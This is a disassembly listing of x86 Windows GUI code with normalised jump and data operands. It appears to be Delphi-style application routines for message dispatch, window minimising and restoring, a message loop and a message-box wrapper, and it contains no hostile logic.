mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
add eax 0xfffffff2
sub eax 0x2
jb r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
sub eax 0xb01a
je r-xdata
mov esi eax
mov eax esi
call sub_4445f8
test eax eax
je r-xdata
sub eax 0xb001
je r-xdata
je r-xdata
sub eax 0x37
je r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xb0 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xb0 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov eax [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_45f1e4
and eax 0x7f
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_45ddd4
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_45dd78
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
sub eax 0x5
je r-xdata
mov eax esi
call sub_4445f8
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10a ] 0x0
je r-xdata
sub eax 0x15
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x112 ] 0x0
je r-xdata
sub eax 0x112
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45d89c
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x13
je r-xdata
mov eax [ rw-data ]
call sub_45c650
push ebp
call sub_45d110
pop ecx
jmp r-xdata
sub eax 0x1a
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x9c ] 0x1
jmp r-xdata
push ebp
call sub_45d110
pop ecx
jmp [ eax * 4 + jump_table_45d23c ]
call GetFocus
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x30 ]
jne r-xdata
jmp r-xdata
mov eax esi
call sub_4445f8
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_45dc50
test al al
je r-xdata
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
sub eax 0xf020
je r-xdata
add eax 0xffffffe0
sub eax 0x7
jb r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax ] 0xde534454
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_448fb4
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_45d0a4
push ebp
call sub_45d110
pop ecx
jmp r-xdata
sub eax 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x27
push ebp
call sub_45d110
pop ecx
jmp r-xdata
push 0x0
push 0x0
push 0xb01a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
push ebp
call sub_45d110
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
xor eax eax
call sub_419a60
jmp r-xdata
xor eax eax
call sub_454fc8
test eax eax
je r-xdata
mov [ rw-data ] 0x0
call GetFocus
mov ebx eax
mov eax esi
call sub_4445f8
push eax
call SetFocus
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax esi
call sub_43efc4
push ebx
call SetFocus
mov [ rw-data ] 0x1
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45d8b8
jmp r-xdata
sub eax 0x100
je r-xdata
mov esi [ ebp - 0x8 ]
mov esi [ esi + 0x8 ]
push esi
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
add ebx 0xbc00
push ebx
mov eax [ ebp - 0x8 ]
push esi
call SendMessageA
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x1e1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9e ] 0x0
je r-xdata
push ebp
call sub_45d110
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
sbb eax eax
inc eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x9d ] al
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
jmp r-xdata
call sub_45a850
jmp r-xdata
push ebp
call sub_45d110
pop ecx
jmp r-xdata
push ebp
call sub_45d14c
pop ecx
jmp r-xdata
push ebp
call sub_45d110
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xac ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_45cfb0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xac ]
test eax eax
je r-xdata
push eax
call SetFocus
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45d968
jmp r-xdata
jmp r-xdata
call sub_42c584
call sub_42c664
test al al
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_45cfa0
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45cfb0
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45cfa8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_454e78
mov edx [ ebp - 0x4 ]
mov [ edx + 0xac ] eax
push ebp
call sub_45d110
pop ecx
jmp r-xdata
call sub_454f2c
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xac ] edx
push ebp
call sub_45d110
pop ecx
jmp r-xdata
call sub_42c584
call sub_42c6c0
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx 0x8000
mov eax r-xdata
call sub_40d0e8
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
call GetLastError
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
push eax
call GetProcAddress
mov esi eax
mov ebx esi
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
push edx
mov edx [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call ebx
jmp r-xdata
sub_45d8b8
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_45cfa0
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x6
mov eax [ ebx + 0x30 ]
call sub_45c8d0
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
mov eax [ ebx + 0x44 ]
call sub_4445f8
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push 0x40
push 0x0
mov esi [ ebx + 0x44 ]
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x44 ]
push eax
mov eax [ esi + 0x40 ]
push eax
mov eax [ ebx + 0x44 ]
call sub_4445f8
push eax
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
push 0x0
push 0xf020
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
cmp [ ebx + 0x11a ] 0x0
je r-xdata
sub_45d968
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x9
mov eax [ ebx + 0x30 ]
call sub_45c8d0
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
mov eax [ ebx + 0x44 ]
call sub_4445f8
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
adc eax 0x0
push 0x0
push 0xf120
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
mov eax ebx
call sub_45cfb0
mov eax [ rw-data ]
mov esi [ eax + 0x64 ]
test esi esi
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
push 0x40
push 0x0
push 0x0
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
mov eax esi
call sub_4445f8
push eax
call SetFocus
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
xor edx edx
call sub_4585dc
mov eax [ ebx + 0x44 ]
call sub_45a9f8
sub_45da68
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call GetLastActivePopup
mov esi eax
test esi esi
je r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
push esi
call IsWindowVisible
test eax eax
je r-xdata
push esi
call IsWindowEnabled
test eax eax
je r-xdata
push esi
call SetForegroundWindow
sub_45daa4
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
je r-xdata
mov eax esi
mov edx [ ebx + 0x8c ]
call sub_4040c8
push 0x100
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
call GetWindowTextA
mov ecx eax
mov edx esp
mov eax esi
call sub_404164
jmp r-xdata
add esp 0x100
pop esi
pop ebx
retn
sub_45daf0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0xb0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
push edi
push esi
call IsDialogMessageA
cmp eax 0x1
sbb eax eax
inc eax
sub_45db14
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x22f ] 0x2
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x6c ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x6c ]
cmp [ edx + 0x22f ] 0x1
jne r-xdata
push edi
mov eax [ esi + 0x254 ]
push eax
call TranslateMDISysAccel
cmp eax 0x1
sbb eax eax
inc eax
sub_45db64
push ebx
push esi
push edi
push ebp
mov esi edx
mov edi eax
xor ebx ebx
mov eax [ esi + 0x4 ]
cmp eax 0x100
jb r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp eax 0x108
ja r-xdata
call GetCapture
mov ebp eax
test ebp ebp
jne r-xdata
push 0xfffffffa
push ebp
call GetWindowLongA
cmp eax [ rw-data ]
jne r-xdata
mov ebp [ esi ]
mov eax [ edi + 0x44 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov eax ebp
call sub_43ac84
test eax eax
jne r-xdata
cmp ebp [ eax + 0x254 ]
jne r-xdata
mov bl 0x1
test ebp ebp
jne r-xdata
test ebp ebp
jne r-xdata
call sub_4445f8
mov ebp eax
jmp r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov ebp [ esi ]
push ebp
call GetParent
mov ebp eax
mov bl 0x1
jmp r-xdata
sub_45dc1c
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebp eax
xor ebx ebx
mov esi [ ebp + 0x84 ]
test esi esi
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xdc ]
test al al
je r-xdata
mov eax ebp
call sub_45eb7c
sub_45dc50
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov ebx eax
mov [ esp ] 0x0
cmp [ ebx + 0x12a ] 0x0
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov ecx esp
mov edx ebp
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
mov al 0x1
mov edi [ ebx + 0x44 ]
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov eax edi
call sub_4445f8
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebp
mov eax [ ebx + 0x44 ]
mov si 0xffab
call sub_40349c
test al al
jne r-xdata
sub_45dcbc
push ebx
push esi
push edi
push ecx
mov edi edx
mov esi eax
xor ebx ebx
push 0x1
push 0x0
push 0x0
push 0x0
push edi
call PeekMessageA
test eax eax
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov bl 0x1
cmp [ edi + 0x4 ] 0x12
je r-xdata
mov [ esi + 0x9c ] 0x1
mov [ esp ] 0x0
cmp [ esi + 0xda ] 0x0
je r-xdata
mov edx edi
mov eax esi
call sub_45dc1c
test al al
jne r-xdata
mov ecx esp
mov edx edi
mov eax [ esi + 0xdc ]
call [ esi + 0xd8 ]
cmp [ esp ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_45db14
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_45db64
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_45daf0
test al al
jne r-xdata
push edi
call TranslateMessage
push edi
call DispatchMessageA
jmp r-xdata
sub_45dd54
push ebx
add esp 0xffffffe4
mov ebx eax
mov edx esp
mov eax ebx
call sub_45dcbc
test al al
jne r-xdata
add esp 0x1c
pop ebx
retn
mov edx esp
mov eax ebx
call sub_45e624
sub_45dd78
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
call sub_413dc4
mov eax 0x8
call sub_4026cc
mov edx [ ebp + 0x8 ]
mov [ eax ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov edx eax
mov eax [ ebx + 0xa8 ]
call sub_413c88
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebx
pop ebp
retn 0x8
lea edx [ ebp + 0x8 ]
push edx
push 0x0
push 0xb020
push eax
call SendMessageA
jmp r-xdata
sub_45ddd4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
inc edi
xor esi esi
lea edx [ ebp + 0x8 ]
push edx
push 0x1
push 0xb020
push eax
call SendMessageA
jmp r-xdata
inc esi
dec edi
jne r-xdata
mov edx [ ebp + 0xc ]
cmp edx [ eax + 0x4 ]
jne r-xdata
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_413de4
mov edx [ eax ]
cmp edx [ ebp + 0x8 ]
jne r-xdata
mov edx 0x8
call sub_4026ec
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_413cd4
jmp r-xdata
sub_45de68
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax ebx
call [ eax - 0xc ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
xor eax eax
push ebp
push sub_45dea6
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
or edx 0xffffffff
mov eax ebx
mov edi [ eax ]
call [ edi + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x44 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov edi ebx
mov eax edi
call sub_4445d4
mov [ esi + 0x44 ] edi
sub_45dee8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x1
xor edx edx
push ebp
push sub_45dfc6
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax sub_454df0
call sub_407cc4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45dfcd
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x0
retn
mov edx [ rw-data ]
mov edx [ edx ]
sub edx 0x3
je r-xdata
mov dl 0x2
call sub_4585dc
sub edx 0x4
jne r-xdata
xor eax eax
push ebp
push j_sub_403740#4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_45dd54
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x0
je r-xdata
mov [ eax + 0x22b ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov dl 0x1
call sub_4574e4
mov eax [ ebp - 0x4 ]
call sub_45d8b8
jmp r-xdata
sub_45dfe8
push ebx
push esi
mov esi edx
mov ebx eax
call GetCapture
test eax eax
je r-xdata
call sub_40275c
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
call sub_40277c
push eax
call sub_40275c
pop edx
call sub_40b574
call sub_40275c
mov edx [ rw-data ]
call sub_40342c
test al al
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0xd2 ] 0x0
je r-xdata
call sub_40275c
mov edx eax
mov eax ebx
call sub_45e1e0
pop esi
pop ebx
retn
call sub_40275c
mov ecx eax
mov edx esi
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
jmp r-xdata
sub_45e078
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
call GetActiveWindow
mov [ ebp - 0xc ] eax
push 0x2
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x14 ] eax
push 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
xor eax eax
call sub_454e78
mov [ ebp - 0x10 ] eax
call sub_454d94
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
call sub_45d01c
test al al
je r-xdata
mov [ ebp - 0x44 ] 0x28
lea eax [ ebp - 0x44 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
lea eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call GetWindowRect
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x3c ]
sub ecx edx
sar ecx 0x1
jns r-xdata
xor ecx ecx
push ebp
push sub_45e1cd
push [ fs : ecx ]
mov [ fs : ecx ] esp
push ebx
push edi
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call MessageBoxA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e1d4
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
or ebx 0x100000
add ecx edx
push ecx
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x40 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
mov eax [ ebp - 0x10 ]
call sub_454f2c
mov eax [ ebp - 0xc ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x1c ]
call sub_454d9c
retn
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x48 ]
mov edx [ ebp - 0x50 ]
sub ecx edx
sar ecx 0x1
jns r-xdata
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
add ecx edx
push ecx
mov edx [ ebp - 0x4c ]
mov eax [ ebp - 0x54 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
sub_45e1e0
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x108 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45e29b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x4 ]
call sub_40410c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x10
lea edx [ ebp - 0x108 ]
mov eax ebx
call sub_45daa4
mov eax [ ebp - 0x108 ]
call sub_404534
push eax
mov eax [ ebp - 0x4 ]
call sub_404534
mov edx eax
mov eax ebx
pop ecx
call sub_45e078
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e2a2
lea eax [ ebp - 0x108 ]
call sub_404074
lea eax [ ebp - 0x4 ]
call sub_404074
retn
mov eax [ ebp - 0x4 ]
call sub_408544
mov edx eax
lea eax [ ebp - 0x104 ]
call sub_402db0
lea eax [ ebp - 0x104 ]
mov edx r-xdata
call sub_402bc8
jbe r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_40433c
sub_45e2b8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] dx
mov esi eax
xor ebx ebx
mov [ esp + 0x8 ] 0x1
mov eax [ rw-data ]
mov edi [ eax + 0x68 ]
test edi edi
je r-xdata
cmp [ esi + 0xf2 ] 0x0
je r-xdata
cmp [ edi + 0x2aa ] 0x0
je r-xdata
test edi edi
je r-xdata
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ esi + 0xf4 ]
call [ esi + 0xf0 ]
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ edi + 0x2ac ]
call [ edi + 0x2a8 ]
mov ebx eax
jmp r-xdata
cmp [ esp + 0x8 ] 0x0
je r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax ebx
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax edi
call sub_444794
cmp ax 0xffff
jne r-xdata
mov [ esp + 0x8 ] 0x0
test edi edi
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
cmp [ esi + 0x50 ] 0x0
je r-xdata
mov eax edi
call sub_4448fc
test al al
je r-xdata
cmp [ edi + 0x220 ] 0x0
jne r-xdata
cmp [ esi + 0xa4 ] 0x0
jne r-xdata
mov ebp [ esi + 0x30 ]
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
cmp [ edi + 0x23c ] 0x0
je r-xdata
mov [ esp + 0x8 ] 0x0
mov eax [ esp + 0x4 ]
push eax
movzx eax [ esp + 0x4 ]
push eax
push 0xb01f
mov eax [ esi + 0x30 ]
push eax
call PostMessageA
mov eax esi
call sub_45e95c
test al al
je r-xdata
call sub_4445f8
mov ebp eax
mov eax edi
call sub_4445f8
mov ebp eax
mov eax esi
call sub_45e95c
test al al
je r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ esi + 0x50 ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ edi + 0x23c ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
sub_45e420
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_45e478
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_45e95c
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_45f1a8
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0xc ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e47f
lea eax [ ebp - 0x4 ]
call sub_404074
retn
sub_45e488
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_45e4e0
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_45e95c
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_45f1a8
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0x10 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e4e7
lea eax [ ebp - 0x4 ]
call sub_404074
retn
sub_45e4f8
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x88 ]
je r-xdata
pop esi
pop ebx
retn
mov eax edx
mov [ ebx + 0x88 ] al
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_4032a0
xor eax eax
mov [ ebx + 0x84 ] eax
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x2c ]
mov esi eax
mov [ ebx + 0x84 ] esi
mov edx [ ebx + 0x5c ]
mov eax esi
call sub_43df98
jmp r-xdata
sub_45e548
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_45baf4
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
call sub_4445f8
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45bae0
mov ebx eax
mov eax ebx
call sub_4448fc
test al al
je r-xdata
mov eax ebx
call sub_4445f8
push eax
